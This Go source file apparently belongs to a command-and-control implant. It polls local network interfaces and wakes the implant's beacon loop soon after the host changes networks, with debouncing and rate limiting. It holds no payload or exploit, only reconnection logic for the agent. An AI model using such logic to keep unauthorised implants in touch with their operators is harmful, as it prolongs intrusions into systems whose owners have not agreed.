package main

import (
	"net"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// networkWakePollInterval is how often the agent checks for a network change
// while it sleeps. A change (interface up/down, new/removed address) wakes the
// beacon loop immediately instead of waiting out the full sleep, so an implant
// that moved networks (VPN up, Wi-Fi switch, DHCP renew) reconnects promptly.
// The check is a cheap list of local interfaces, not a packet capture.
const networkWakePollInterval = 20 * time.Second

// networkWakeMinInterval coalesces repeated confirmed changes (a VPN rotating
// gateways, a flapping Wi-Fi link) into at most one wake per minute. Without
// it every flap would shorten the sleep to the poll interval.
const networkWakeMinInterval = 60 * time.Second

var networkWakeOnce sync.Once

// startNetworkWakeMonitor begins watching local interface state. Safe to call
// more than once: only the first call starts the goroutine.
func startNetworkWakeMonitor() {
	networkWakeOnce.Do(func() {
		go monitorNetworkChanges(networkWakePollInterval, networkWakeMinInterval, networkFingerprint, wakeBeaconLoop, nil)
	})
}

// monitorNetworkChanges wakes the agent when the fingerprint changes and the
// new state is stable. A change must be observed on two consecutive polls: a
// link that alternates between two states never produces a wake, while a real
// move (Wi-Fi to Ethernet, VPN up) wakes within roughly two poll intervals.
// Confirmed wakes are additionally rate-limited by minWake. An empty
// fingerprint (transient OS error) never counts as a change, so a failed query
// cannot cause a wake storm. The arguments are injected for testability; the
// real monitor passes the global beacon-loop wake and a nil stop channel
// (which blocks forever).
func monitorNetworkChanges(interval, minWake time.Duration, fingerprint func() string, wake func(), stop <-chan struct{}) {
	if interval <= 0 {
		interval = networkWakePollInterval
	}
	baseline := fingerprint()
	pending := ""
	var lastWake time.Time
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
		}
		current := fingerprint()
		if current == "" || current == baseline {
			// No usable reading, or we are back to the last confirmed state.
			pending = ""
			continue
		}
		if current != pending {
			// First sighting of a new state: wait for one more poll before
			// treating it as stable, so a flapping interface cannot shorten
			// the sleep to the poll interval.
			pending = current
			continue
		}
		baseline = current
		pending = ""
		if minWake > 0 && !lastWake.IsZero() && time.Since(lastWake) < minWake {
			continue
		}
		lastWake = time.Now()
		logDebugf("Network change confirmed, waking beacon loop")
		wake()
	}
}

// networkFingerprint returns a stable description of the host's non-loopback
// interfaces and their addresses. Entries are sorted so OS enumeration order
// changes alone do not look like a network change.
func networkFingerprint() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	entries := make([]string, 0, len(ifaces))
	for _, ifc := range ifaces {
		if ifc.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs := make([]string, 0, 4)
		if list, err := ifc.Addrs(); err == nil {
			for _, addr := range list {
				addrs = append(addrs, addr.String())
			}
		}
		sort.Strings(addrs)
		entries = append(entries, ifc.Name+"|"+strconv.Itoa(int(ifc.Flags))+"|"+strings.Join(addrs, ","))
	}
	sort.Strings(entries)
	return strings.Join(entries, ";")
}
